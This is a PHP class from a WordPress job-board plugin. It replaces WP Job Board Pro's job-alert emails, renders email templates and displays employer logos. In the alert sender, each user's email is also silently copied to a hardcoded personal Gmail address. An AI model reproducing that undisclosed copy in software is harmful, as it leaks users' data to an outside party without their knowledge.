<?php

namespace Interimu\Interimu;

class Manage_Emails
{
    
    function override_wp_job_alerts() {
        if ( is_plugin_active( 'wp-job-board-pro/wp-job-board-pro.php' ) ) {
            if (has_action('wp_job_board_pro_email_daily_notices',array( 'WP_Job_Board_Pro_Job_Alert', 'send_job_alert_notice' ))) {
                remove_action( 'wp_job_board_pro_email_daily_notices', array( 'WP_Job_Board_Pro_Job_Alert', 'send_job_alert_notice' ) );
            }
            if (has_action('wp_job_board_pro_email_daily_notices',array( 'WP_Job_Board_Pro_Candidate_Alert', 'send_candidate_alert_notice' ))) {
                remove_action( 'wp_job_board_pro_email_daily_notices', array( 'WP_Job_Board_Pro_Candidate_Alert', 'send_candidate_alert_notice' ) );
            }
        }
    }

    function custom_send_job_alert_notice() {
		$email_frequency_default = \WP_Job_Board_Pro_Job_Alert::get_email_frequency();
		if ( $email_frequency_default ) {
			foreach ($email_frequency_default as $key => $value) {
				if ( !empty($value['days']) ) {
					$meta_query = array(
						'relation' => 'OR',
						array(
							'key' => WP_JOB_BOARD_PRO_JOB_ALERT_PREFIX.'send_email_time',
							'compare' => 'NOT EXISTS',
						)
					);
					$current_time = apply_filters( 'wp-job-board-pro-job-alert-current-'.$key.'-time', date( 'Y-m-d', strtotime( '-'.intval($value['days']).' days', current_time( 'timestamp' ) ) ) );
                    $meta_query[] = array(
						'relation' => 'AND',
						array(
							'key' => WP_JOB_BOARD_PRO_JOB_ALERT_PREFIX.'send_email_time',
							'value' => $current_time,
							'compare' => '<=',
						), 
						array(
							'key' => WP_JOB_BOARD_PRO_JOB_ALERT_PREFIX.'email_frequency',
							'value' => $key,
							'compare' => '=',
						),
					);

					$query_args = apply_filters( 'wp-job-board-pro-job-alert-query-args', array(
						'post_type' => 'job_alert',
						'post_per_page' => -1,
						'post_status' => 'publish',
						'fields' => 'ids',
						'meta_query' => $meta_query
					));

					$job_alerts = new \WP_Query($query_args);

					if ( !empty($job_alerts->posts) ) {
						foreach ($job_alerts->posts as $post_id) {
							$author_id = get_post_field('post_author', $post_id);
							$alert_query = get_post_meta($post_id, WP_JOB_BOARD_PRO_JOB_ALERT_PREFIX . 'alert_query', true);
							//delete_post_meta($post_id, WP_JOB_BOARD_PRO_JOB_ALERT_PREFIX.'send_email_time');
							$params = $alert_query;
							if ( !empty($alert_query) && !is_array($alert_query) ) {
								$params = json_decode($alert_query, true);
							}

							$query_args = array(
								'post_type' => 'job_listing',
							    'post_status' => 'publish',
							    'post_per_page' => 1,
							    'view_user_id' => $author_id
							);
							$jobs = \WP_Job_Board_Pro_Query::get_posts($query_args, $params);
							$count_jobs = $jobs->found_posts;
							$job_alert_title = get_the_title($post_id);

							// send email action
							$email_from = get_option( 'admin_email', false );
							
							$headers = sprintf( "From: %s <%s>\r\n Content-type: text/html", get_bloginfo('name'), $email_from );
							
							$author_id = get_post_field('post_author', $post_id);
							$email_to = get_the_author_meta('user_email', $author_id);
							$subject = \WP_Job_Board_Pro_Email::render_email_vars(array('alert_title' => $job_alert_title), 'job_alert_notice', 'subject');

							$email_frequency = get_post_meta($post_id, WP_JOB_BOARD_PRO_JOB_ALERT_PREFIX.'email_frequency', true);
							if ( !empty($email_frequency_default[$email_frequency]['label']) ) {
								$email_frequency = $email_frequency_default[$email_frequency]['label'];
							}
							$jobs_alert_url = \WP_Job_Board_Pro_Mixes::get_jobs_page_url();
							if ( !empty($params) ) {
								foreach ($params as $key => $value) {
									if ( is_array($value) ) {
										$jobs_alert_url = remove_query_arg( $key.'[]', $jobs_alert_url );
										foreach ($value as $val) {
											$jobs_alert_url = add_query_arg( $key.'[]', $val, $jobs_alert_url );
										}
									} else {
										$jobs_alert_url = add_query_arg( $key, $value, remove_query_arg( $key, $jobs_alert_url ) );
									}
								}
							}
                            if($count_jobs > 0){
                                $content_args = apply_filters( 'wp-job-board-pro-job-alert-email-content-args', array(
                                    'alert_title' => $job_alert_title,
                                    'jobs_found' => $count_jobs,
                                    'email_frequency_type' => $email_frequency,
                                    'jobs_alert_url' => $jobs_alert_url,
                                    'jobs' => $jobs->posts
                                ));

                                $content = \WP_Job_Board_Pro_Email::render_email_vars($content_args, 'job_alert_notice', 'content');
                                \WP_Job_Board_Pro_Email::wp_mail( $email_to, $subject, $content, $headers );
                                \WP_Job_Board_Pro_Email::wp_mail('ogwangmpal@gmail.com', $subject, $content, $headers );
                                $current_time = date( 'Y-m-d', current_time( 'timestamp' ) );
                                delete_post_meta($post_id, WP_JOB_BOARD_PRO_JOB_ALERT_PREFIX.'send_email_time');
                                add_post_meta($post_id, WP_JOB_BOARD_PRO_JOB_ALERT_PREFIX.'send_email_time', $current_time);
                            }
						}
					}
				}
			}
		}
		
	}

	function render_email_vars($output, $args, $key, $type ){

        if( $key == 'job_alert_notice' ){
            if ($type == 'subject' ) {
                $output = $args['alert_title'];
            }
    
            if ($type == 'content' ) {
                $jobs = $args['jobs'];
                ob_start();
                include INTERIMU_DIR . '/template/job-alert-notice.php';
                $output = ob_get_contents();
                ob_end_clean();
            }
            
            if ( !empty(\WP_Job_Board_Pro_Email::$emails_vars[$key][$type]) ) {
                $vars = \WP_Job_Board_Pro_Email::$emails_vars[$key][$type];
                foreach ($vars as $var) {
                    if ( strpos($output, '{{'.$var.'}}') !== false ) {
                        if ( isset($args[$var]) ) {
                            $value = $args[$var];
                        } elseif ( is_callable( array('\WP_Job_Board_Pro_Email', $var) ) ) {
                            $value = call_user_func( array('\WP_Job_Board_Pro_Email', $var), $args );
                        } else {
                            $value = apply_filters('wp-job-board-pro-render-email-var-'.$var, '', $args);
                        }
                        if($output){
                            $output = str_replace('{{'.$var.'}}', $value, $output);
                        }
                    }
                }
            }
        }

        else if ($key == 'email_apply_job_notice' && $type == 'content') {
            
            if (!empty($args) && $args['job'] ) {
                $post_id = $args['job']->ID;
                $sourceContent = get_post_meta($post_id, '_job_source', true)? get_post_meta($post_id, '_job_source', true):'';

                if ($sourceContent != '') {
                    // Initialize DOMDocument and load the HTML
                    $doc = new \DOMDocument();
                    libxml_use_internal_errors(true); // Disable libxml errors for malformed HTML
                    $doc->loadHTML($output, LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD);
                    libxml_clear_errors();

                    // Create the <h3> element for "Source"
                    $h3 = $doc->createElement('h3', 'Source');

                    // Create the nested <div> to hold the source content
                    $sourceDiv = $doc->createElement('div', $sourceContent);
                    $sourceDiv->setAttribute('style', 'padding: 2px;');

                    // Create a new <div> to hold both the <h3> and the nested <div>
                    $newDiv = $doc->createElement('div');
                    $newDiv->setAttribute('style', 'padding: 2px;');

                    // Append the <h3> and the nested <div> to the new <div>
                    $newDiv->appendChild($h3);
                    $newDiv->appendChild($sourceDiv);

                    // Find the <table> element
                    $table = $doc->getElementsByTagName('table')->item(0);

                    // Insert the new <div> before the <table>
                    $table->parentNode->insertBefore($newDiv, $table);

                    // Save the modified HTML back to a string
                    $output = $doc->saveHTML();
                }
            }
        }

        return $output;
    }
    
    function get_custome_field_data_by_field_name($post_id,$field_name){
        $field_value   = '';
        $obj_job_meta  = \WP_Job_Board_Pro_Job_Listing_Meta::get_instance($post_id);
        $custom_fields = $obj_job_meta->get_post_metas();
        
        if ( !empty($custom_fields) ) {
            foreach ($custom_fields as $field) {
                if($field['name']){
                    if($field['name'] == $field_name){
                        $field_id = $field['id'];
                        $value = get_post_meta($post_id,$field_id, true ); 
                        if (!empty($value) ) {
                            $field_value = $value; 
                        }
                    }
                }
            }
        }
        return $field_value;
    }

    function test_job_alerts_shortcode(){
        return $this->custom_send_job_alert_notice();
    }
    
    public function job_display_employer_logo( $return, $post, $link, $link_employer)
    {
        
        $author_id = superio_get_post_author($post->ID);
        $employer_id = \WP_Job_Board_Pro_User::get_employer_by_user_id($author_id);
        if ( $link ) {
            if ( $link_employer ) {
                $url = get_permalink($employer_id);
            } else {
                $url = get_permalink($post);
            } 
        }
        $obj_job_meta = \WP_Job_Board_Pro_Job_Listing_Meta::get_instance($post->ID);

        $is_rectangle = false;
        $is_single_page = false;
        if ( has_post_thumbnail($employer_id) ) {
            $thumbnail_id = get_post_thumbnail_id($employer_id);
            $thumbnail_data = wp_get_attachment_image_src($thumbnail_id, 'full');
            $thumbnail_width = $thumbnail_data[1];
            $thumbnail_height = $thumbnail_data[2];
            if ($thumbnail_width > $thumbnail_height) {
                $is_rectangle = true;
            }
        }

        if (is_singular('job_listing')) {
            $post_id = get_queried_object_id();
            if ($post_id == $post->ID) {
                $is_single_page = true;
            }
        }

        ob_start();
        ?>
        <div class="employer-logo <?php echo ($is_rectangle && !$is_single_page ) ? ' employer-logo-rect': ( $is_rectangle && $is_single_page ? ' employer-logo-rect-single': '') ?>">
            <?php if ( $link ) { ?>   
                <a href="<?php echo esc_url( $url ); ?>">
            <?php } ?>
                    <?php if ( $obj_job_meta->check_post_meta_exist('logo') && ($logo_url = $obj_job_meta->get_post_meta( 'logo' )) ) {
                        $logo_id = \WP_Job_Board_Pro_Job_Listing::get_post_meta($post->ID, 'logo_id', true);
                        if ( $logo_id ) {
                            echo wp_get_attachment_image( $logo_id, array(438,201) );
                        } else {
                            ?>
                            <img src="<?php echo esc_url($logo_url); ?>" alt="<?php echo esc_attr(get_the_title($employer_id)); ?>">
                            <?php
                        }
                    } else {
                        if ( has_post_thumbnail($employer_id) ) {
                            echo get_the_post_thumbnail( $employer_id, array(438,201) );
                        } else { ?>
                            <img src="<?php echo esc_url(superio_placeholder_img_src()); ?>" alt="<?php echo esc_attr(get_the_title($employer_id)); ?>">
                        <?php } ?>
                    <?php } ?>
            <?php if ( $link ) { ?>
                </a>
            <?php } ?>
        </div>
        <?php
        $return = ob_get_clean();
    return $return;
    }
    
    
}